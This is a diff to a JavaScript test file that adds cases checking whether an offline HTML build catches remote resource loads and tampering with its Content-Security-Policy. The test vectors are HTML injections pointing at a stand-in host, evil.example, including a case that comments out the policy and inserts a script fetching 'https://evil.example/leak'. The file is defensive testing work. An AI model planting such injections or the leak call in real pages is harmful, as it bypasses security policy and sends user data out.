@@ -825,7 +825,9 @@ test("standard HTML honors network_access_from_html: remote font loads are remov
       entityEncodedHref: "<link rel=\"icon\" href=\"https&#58;//evil.example/i.png\">",
       styleAttribute: "<div style=\"background:url(//evil.example/a)\"></div>",
       srcsetDataThenRemote: "<img alt=\"\" srcset=\"data:image/png;base64,AAAA 1x, https://evil.example/t.png 2x\">",
-      quotedGreaterThan: "<link title=\">\" rel=\"stylesheet\" href=\"https://evil.example/a.css\">"
+      quotedGreaterThan: "<link title=\">\" rel=\"stylesheet\" href=\"https://evil.example/a.css\">",
+      apostropheInUnquotedValue: "<img alt=a'b src=//evil.example/x.png>",
+      outOfRangeEntity: "<link title=\"&#x110000;\" rel=\"stylesheet\" href=\"https://evil.example/a.css\">"
     };
     const csp = html.match(/  <meta http-equiv="Content-Security-Policy" content="[^"]*">\n/u);
     assert.ok(csp, "offline CSP is present");
@@ -835,7 +837,9 @@ test("standard HTML honors network_access_from_html: remote font loads are remov
       ...Object.entries(vectors).map(([name, vector]) => [name, html.replace("</head>", `${vector}\n</head>`)]),
       ["cspRemoved", html.replace(csp[0], "")],
       ["cspWeakened", html.replace(csp[0], csp[0].replace("default-src 'none'", "default-src *"))],
-      ["cspMovedAfterScript", html.replace(csp[0], "").replace("</head>", `${csp[0]}</head>`)]
+      ["cspMovedAfterScript", html.replace(csp[0], "").replace("</head>", `${csp[0]}</head>`)],
+      ["unterminatedQuoteAtEnd", `${html}<img src=//evil.example/x.png alt="x>`],
+      ["cspCommentedOut", html.replace(`  <meta charset="UTF-8">\n${csp[0]}`, `  <!--\n  <meta charset="UTF-8">\n${csp[0]}  -->\n`).replace("</head>", "<script>fetch(\"https://evil.example/leak\")</script>\n</head>")]
     ];
     for (const [name, injected] of edits) {
       assert.notEqual(injected, html, name);
